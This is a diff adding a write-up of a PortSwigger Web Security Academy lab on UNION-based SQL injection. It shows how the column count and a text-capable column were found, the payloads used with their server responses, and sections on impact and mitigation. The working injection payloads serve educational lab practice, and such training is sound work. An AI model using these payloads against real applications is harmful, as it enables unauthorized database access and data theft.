@@ -1,0 +1,261 @@
+# SQL Injection UNION Attack – Finding a Column Containing Text
+
+## Lab Information
+
+| Field | Value |
+|-------|-------|
+| Platform | PortSwigger Web Security Academy |
+| Category | SQL Injection |
+| Technique | UNION-based SQL Injection |
+| Difficulty | Apprentice |
+| Status | ✅ Solved |
+
+---
+
+## Overview
+
+This lab demonstrates how to identify which column in a SQL query is capable of displaying string (text) data during a UNION-based SQL injection attack.
+
+After determining the total number of columns, the next objective is to discover which column accepts text values. Once identified, the provided target string is injected into the correct column to successfully complete the lab.
+
+---
+
+## Objective
+
+- Determine the number of columns returned by the original query.
+- Identify the column capable of displaying text.
+- Inject the provided string into the correct column.
+- Successfully solve the lab.
+
+---
+
+## Environment
+
+- PortSwigger Web Security Academy
+- Burp Suite Professional
+- Burp Repeater
+- Firefox
+
+---
+
+## Methodology
+
+### Step 1 — Intercept the Request
+
+Capture the vulnerable request using Burp Suite Proxy and send it to Repeater.
+
+Example request:
+
+```http
+GET /filter?category=Gifts HTTP/2
+```
+
+---
+
+### Step 2 — Determine the Number of Columns
+
+Test different UNION SELECT statements until the response is successful.
+
+Successful payload:
+
+```sql
+' UNION SELECT NULL,NULL,NULL--
+```
+
+Result:
+
+- Total columns identified: **3**
+
+---
+
+### Step 3 — Identify the Text Column
+
+Insert a test string into each column individually.
+
+Attempt 1
+
+```sql
+' UNION SELECT 'abcd',NULL,NULL--
+```
+
+Response:
+
+```
+HTTP 500 Internal Server Error
+```
+
+---
+
+Attempt 2
+
+```sql
+' UNION SELECT NULL,'abcd',NULL--
+```
+
+Response:
+
+```
+HTTP 200 OK
+```
+
+The string appeared in the application's response.
+
+Result:
+
+✅ Second column accepts text.
+
+---
+
+### Step 4 — Retrieve the Target String
+
+The lab provided the following string:
+
+```
+YUz0R9
+```
+
+Inject the value into the identified text column.
+
+Payload:
+
+```sql
+' UNION SELECT NULL,'YUz0R9',NULL--
+```
+
+---
+
+### Step 5 — Verify the Result
+
+The application accepted the payload and marked the lab as solved.
+
+Result:
+
+✅ Lab Solved Successfully
+
+---
+
+## Payloads Used
+
+Determine columns
+
+```sql
+' UNION SELECT NULL,NULL,NULL--
+```
+
+Test first column
+
+```sql
+' UNION SELECT 'abcd',NULL,NULL--
+```
+
+Test second column
+
+```sql
+' UNION SELECT NULL,'abcd',NULL--
+```
+
+Final payload
+
+```sql
+' UNION SELECT NULL,'YUz0R9',NULL--
+```
+
+---
+
+## Findings
+
+| Observation | Result |
+|------------|--------|
+| Number of columns | 3 |
+| Text-supported column | 2 |
+| Final payload | Successful |
+| Lab status | Solved |
+
+---
+
+## Screenshots
+
+### Step 1 — Proxy HTTP History
+
+![](screenshots/01-proxy-http-history.png)
+
+---
+
+### Step 2 — Original Response
+
+![](screenshots/02-original-response.png)
+
+---
+
+### Step 3 — Invalid Payload
+
+![](screenshots/03-invalid-payload.png)
+
+---
+
+### Step 4 — Valid Text Column
+
+![](screenshots/04-valid-text-column.png)
+
+---
+
+### Step 5 — Final Payload
+
+![](screenshots/05-final-payload.png)
+
+---
+
+### Step 6 — Lab Solved
+
+![](screenshots/06-lab-solved.png)
+
+---
+
+## Security Impact
+
+If exploited, UNION-based SQL Injection may allow an attacker to:
+
+- Read sensitive database information
+- Extract usernames and passwords
+- Enumerate database structure
+- Access confidential business data
+- Bypass intended application logic
+
+---
+
+## Mitigation
+
+- Use parameterized queries (prepared statements)
+- Avoid dynamic SQL construction
+- Validate and sanitize user input
+- Apply least-privilege database permissions
+- Implement secure error handling
+- Deploy a Web Application Firewall (WAF)
+- Conduct regular security assessments
+
+---
+
+## Skills Demonstrated
+
+- SQL Injection Testing
+- UNION-based Injection
+- Column Enumeration
+- Data Type Identification
+- Burp Suite Repeater
+- HTTP Request Analysis
+- Secure Documentation
+
+---
+
+## References
+
+- PortSwigger Web Security Academy
+- OWASP SQL Injection Prevention Cheat Sheet
+- OWASP Web Security Testing Guide
+- CWE-89: SQL Injection
+
+---
+
+## Disclaimer
+
+This assessment was conducted exclusively within the PortSwigger Web Security Academy laboratory environment for educational purposes. All testing was performed on authorized systems.
